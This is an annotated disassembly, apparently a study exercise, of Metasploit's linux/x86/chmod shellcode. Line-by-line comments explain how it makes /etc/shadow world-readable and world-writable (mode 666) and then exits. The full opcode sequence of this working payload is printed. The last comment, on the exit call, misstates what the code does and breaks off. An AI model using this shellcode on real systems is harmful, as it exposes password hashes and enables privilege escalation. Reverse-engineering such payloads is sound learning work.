; Filename: analyze_chmod_opcodes.asm
; Name of payload: chmod.rb

; Source:

; /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.12.20/modules/payloads/singles/linux/x86/chmod.rb

; man 2 chmod 
    ; int chmod(const char *pathname, mode_t mode);
    ; S_IRUSR  (00400)  read by owner
    ; S_IWUSR  (00200)  write by owner
    ; S_IRGRP  (00040)  read by group
    ; S_IWGRP  (00020)  write by group
    ; S_IROTH  (00004)  read by others
    ; S_IWOTH  (00002)  write by others


global _start

section .text

_start:

    00000000  99                cdq                    ; EDX gets 0x0. CDQ converts signed DWORD in EAX to a signed quad word in EDX:EAX by extending the high order bit of EAX (in this case 0x0) throughout EDX.
    00000001  6A0F              push byte +0xf         ; push 0xf (15) on the stack
    00000003  58                pop eax                ; EAX gets 0xf for chmod() syscall
    00000004  52                push edx               ; push value of EDX (0x00000000) on the stack
    00000005  E80C000000        call dword 0x16        ; call address 0x16 and push address of next instruction ('/etc/shadow\x00') on the stack

    0000000A  2F                das                    ; opcodes for 0x0000000A to...
    0000000B  657463            gs jz 0x71
    0000000E  2F                das
    0000000F  7368              jnc 0x79
    00000011  61                popad
    00000012  646F              fs outsd
    00000014  7700              ja 0x16                ; 0x00000014 == '/etc/shadow\x00'

    00000016  5B                pop ebx                ; EBX gets address of '/etc/shadow\x00'
    00000017  68B6010000        push dword 0x1b6       ; push 0x1b6 (666 octal) on the stack
    0000001C  59                pop ecx                ; ECX gets 0x1b6 (666 octal)
    0000001D  CD80              int 0x80               ; invoke chmod() syscall
                                                       ; int chmod(const char *pathname, mode_t mode); 
                                                       ; EAX gets 0xf (chmod() syscall), EBX gets the address of /etc/shadow\x00 (which is the file on which we will use chmod), ECX gets 0x1b6 (666) (which is a bitmask create by ORing together S_IRUSR (read by owner) (00400) | S_IWUSR (write by owner) (00200) | S_IRGRP (read by group) (00040) | S_IWGRP (write by group) (00020) | S_IROTH (read by others) (00004) | S_IWOTH (write by others) (00002)

    0000001F  6A01              push byte +0x1         ; push 0x1 on the stack
    00000021  58                pop eax                ; EAX gets 0x1
    00000022  CD80              int 0x80               ; invoke exit() syscall
                                                       ; EAX gets 0xf (chmod() syscall), EBX gets 

